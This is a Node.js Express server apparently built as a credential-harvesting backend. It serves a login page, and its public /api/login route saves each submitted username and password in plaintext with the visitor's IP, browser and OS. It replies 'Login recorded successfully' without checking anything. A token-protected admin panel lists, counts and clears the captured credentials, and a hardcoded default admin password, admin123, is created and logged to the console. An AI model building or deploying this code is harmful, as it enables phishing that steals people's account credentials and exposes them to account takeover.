const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
require('dotenv').config();

const app = express();

// Middleware
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, '../public')));

// ============================================
// JSON FILE DATABASE
// ============================================
const DATA_FILE = path.join(__dirname, 'data.json');

// Initialize data file if it doesn't exist
function initDataFile() {
    if (!fs.existsSync(DATA_FILE)) {
        const initialData = {
            logins: [],
            admins: []
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(initialData, null, 2));
        console.log('✅ Data file created at:', DATA_FILE);
    }
}

// Read data from JSON file
function readData() {
    try {
        const data = fs.readFileSync(DATA_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading data file:', error);
        return { logins: [], admins: [] };
    }
}

// Write data to JSON file
function writeData(data) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        return true;
    } catch (error) {
        console.error('Error writing data file:', error);
        return false;
    }
}

// Initialize data file
initDataFile();

// ============================================
// MODELS (for JSON file)
// ============================================

// Get all logins
function getLogins() {
    const data = readData();
    return data.logins || [];
}

// Add login
function addLogin(username, password, ip, userAgent, browser, os) {
    const data = readData();
    const login = {
        _id: Date.now().toString(),
        username: username.trim(),
        password: password.trim(),
        timestamp: new Date().toISOString(),
        ip: ip || 'Unknown',
        userAgent: userAgent || 'Unknown',
        browser: browser || 'Unknown',
        os: os || 'Unknown'
    };
    data.logins.push(login);
    writeData(data);
    return login;
}

// Delete login by ID
function deleteLoginById(id) {
    const data = readData();
    const index = data.logins.findIndex(l => l._id === id);
    if (index !== -1) {
        data.logins.splice(index, 1);
        writeData(data);
        return true;
    }
    return false;
}

// Delete all logins
function deleteAllLogins() {
    const data = readData();
    data.logins = [];
    writeData(data);
    return true;
}

// Get admin by username
function getAdmin(username) {
    const data = readData();
    return data.admins.find(a => a.username === username);
}

// Create admin
function createAdmin(username, password) {
    const data = readData();
    const admin = {
        username,
        password
    };
    data.admins.push(admin);
    writeData(data);
    return admin;
}

// ============================================
// ROUTES
// ============================================

// Root route - serve the login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/login.html'));
});

// Public: Save login data
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ error: 'Username and password are required' });
        }

        // Parse user agent
        const ua = req.headers['user-agent'] || '';
        let browser = 'Unknown';
        let os = 'Unknown';

        if (ua.includes('Chrome')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari')) browser = 'Safari';
        else if (ua.includes('Edge')) browser = 'Edge';
        else if (ua.includes('Opera')) browser = 'Opera';

        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

        const login = addLogin(
            username,
            password,
            req.ip || req.connection.remoteAddress,
            ua,
            browser,
            os
        );

        console.log(`🔐 New login: ${username} from ${browser} on ${os}`);

        res.json({
            success: true,
            message: 'Login recorded successfully',
            id: login._id
        });

    } catch (error) {
        console.error('Login save error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin login
app.post('/api/admin/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        // Check environment variable
        if (username === 'admin' && password === process.env.ADMIN_PASSWORD) {
            const token = jwt.sign(
                { username: 'admin', role: 'admin' },
                process.env.JWT_SECRET,
                { expiresIn: '24h' }
            );
            return res.json({
                success: true,
                token,
                message: 'Admin authenticated successfully'
            });
        }

        // Check JSON file for admin
        const admin = getAdmin(username);
        if (admin && await bcrypt.compare(password, admin.password)) {
            const token = jwt.sign(
                { username: admin.username, role: 'admin' },
                process.env.JWT_SECRET,
                { expiresIn: '24h' }
            );
            return res.json({
                success: true,
                token,
                message: 'Admin authenticated successfully'
            });
        }

        res.status(401).json({ error: 'Invalid admin credentials' });

    } catch (error) {
        console.error('Admin login error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Middleware: Authenticate token
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Access denied. No token provided.' });
    }

    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        req.admin = decoded;
        next();
    } catch (error) {
        return res.status(403).json({ error: 'Invalid or expired token.' });
    }
}

// Admin: Get all login data
app.get('/api/admin/data', authenticateToken, async (req, res) => {
    try {
        const logins = getLogins();
        res.json({
            success: true,
            count: logins.length,
            data: logins
        });
    } catch (error) {
        console.error('Error fetching data:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin: Delete single entry
app.delete('/api/admin/data/:id', authenticateToken, async (req, res) => {
    try {
        const { id } = req.params;
        const result = deleteLoginById(id);

        if (!result) {
            return res.status(404).json({ error: 'Entry not found' });
        }

        res.json({
            success: true,
            message: 'Entry deleted successfully'
        });
    } catch (error) {
        console.error('Delete error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin: Clear all data
app.delete('/api/admin/data', authenticateToken, async (req, res) => {
    try {
        deleteAllLogins();
        res.json({
            success: true,
            message: 'All login data cleared'
        });
    } catch (error) {
        console.error('Clear error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin: Get stats
app.get('/api/admin/stats', authenticateToken, async (req, res) => {
    try {
        const logins = getLogins();
        const total = logins.length;
        
        // Today's count
        const today = new Date().toISOString().split('T')[0];
        const todayCount = logins.filter(l => l.timestamp.startsWith(today)).length;
        
        // Unique users
        const uniqueUsers = [...new Set(logins.map(l => l.username))];
        
        // Browser stats
        const browserStats = {};
        logins.forEach(l => {
            browserStats[l.browser] = (browserStats[l.browser] || 0) + 1;
        });
        const browserStatsArray = Object.entries(browserStats).map(([browser, count]) => ({ _id: browser, count }));

        res.json({
            success: true,
            stats: {
                total,
                today: todayCount,
                uniqueUsers: uniqueUsers.length,
                browsers: browserStatsArray
            }
        });
    } catch (error) {
        console.error('Stats error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ============================================
// INIT ADMIN
// ============================================

async function initAdmin() {
    try {
        const existingAdmin = getAdmin('admin');
        if (!existingAdmin) {
            const hashedPassword = await bcrypt.hash('admin123', 10);
            createAdmin('admin', hashedPassword);
            console.log('✅ Default admin created: admin / admin123');
        }
    } catch (error) {
        console.error('Admin init error:', error);
    }
}

// ============================================
// START SERVER
// ============================================

const PORT = process.env.PORT || 3000;

app.listen(PORT, async () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Data stored in: ${DATA_FILE}`);
    await initAdmin();
    console.log(`👤 Admin: admin / ${process.env.ADMIN_PASSWORD || 'admin123'}`);
    console.log(`📱 Open: http://localhost:${PORT} to see the login page`);
});